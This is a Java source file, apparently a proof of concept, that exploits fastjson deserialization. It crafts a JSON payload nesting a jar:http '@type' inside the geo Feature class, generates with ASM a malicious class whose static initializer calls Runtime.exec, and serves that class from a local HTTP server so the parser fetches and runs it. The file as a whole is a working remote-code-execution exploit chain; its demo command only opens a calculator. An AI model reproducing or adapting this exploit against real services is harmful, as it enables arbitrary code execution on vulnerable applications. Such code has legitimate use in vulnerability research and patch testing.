import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.security.CodeSource;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

public class geojson {
    private static final int PORT = 18080;
    private static final String TYPE = "jar:http:..2130706433:" + PORT + ".probe!.Exp";

    private static String poc = "{\n" +
            "  \"@type\":\"com.alibaba.fastjson.support.geo.Feature\",\n" +
            "  \"properties\":{\n" +
            "    \"@type\":\"" + TYPE + "\",\n" +
            "    \"x\":1\n" +
            "  }\n" +
            "}";

    public static void main(String[] args) throws Exception {
        byte[] probeJar = makeProbeJar();
        startServer(probeJar);

        org.springframework.boot.loader.jar.JarFile.registerUrlProtocolHandler();
        URL fastjson = codeSource(com.alibaba.fastjson.JSON.class);
        URL classes = codeSource(geojson.class);
        ClassLoader fatClassLoader = new org.springframework.boot.loader.LaunchedURLClassLoader(
                new URL[] {new URL("jar:" + fastjson + "!/"), classes},
                ClassLoader.getSystemClassLoader().getParent()
        );
        ParserConfig.getGlobalInstance().setDefaultClassLoader(fatClassLoader);

        Thread.sleep(300L);
        System.out.println(poc);

        try {
            JSON.parse(poc);
        } catch (Throwable e) {
            System.out.println(e);
        }

        Thread.sleep(1000L);
    }

    private static URL codeSource(Class clazz) {
        CodeSource codeSource = clazz.getProtectionDomain().getCodeSource();
        return codeSource.getLocation();
    }

    private static byte[] makeProbeJar() throws Exception {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        JarOutputStream jar = new JarOutputStream(bytes);
        jar.putNextEntry(new JarEntry("Exp.class"));
        jar.write(makeExpClass(TYPE.replace('.', '/')));
        jar.closeEntry();
        jar.close();
        return bytes.toByteArray();
    }

    private static byte[] makeExpClass(String internalName) {
        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);

        AnnotationVisitor annotation = writer.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
        annotation.visitEnd();

        MethodVisitor method = writer.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        method.visitCode();
        method.visitVarInsn(Opcodes.ALOAD, 0);
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(1, 1);
        method.visitEnd();

        method = writer.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        method.visitCode();
        method.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        method.visitLdcInsn("open -a calculator");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        method.visitInsn(Opcodes.POP);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(2, 0);
        method.visitEnd();

        writer.visitEnd();
        return writer.toByteArray();
    }

    private static void startServer(final byte[] probeJar) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    ServerSocket serverSocket = new ServerSocket(PORT, 50, InetAddress.getByName("127.0.0.1"));
                    serverSocket.setSoTimeout(8000);
                    long end = System.currentTimeMillis() + 7000L;
                    while (System.currentTimeMillis() < end) {
                        try {
                            Socket socket = serverSocket.accept();
                            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));
                            String line = reader.readLine();
                            System.out.println("[http] " + line);
                            while ((line = reader.readLine()) != null && line.length() > 0) {
                                // drain headers
                            }
                            OutputStream output = socket.getOutputStream();
                            output.write(("HTTP/1.1 200 OK\r\nContent-Type: application/java-archive\r\nContent-Length: "
                                    + probeJar.length + "\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
                            output.write(probeJar);
                            output.flush();
                            socket.close();
                        } catch (SocketTimeoutException e) {
                            break;
                        }
                    }
                    serverSocket.close();
                } catch (Exception e) {
                    System.out.println(e);
                }
            }
        });
        thread.setDaemon(true);
        thread.start();
    }
}
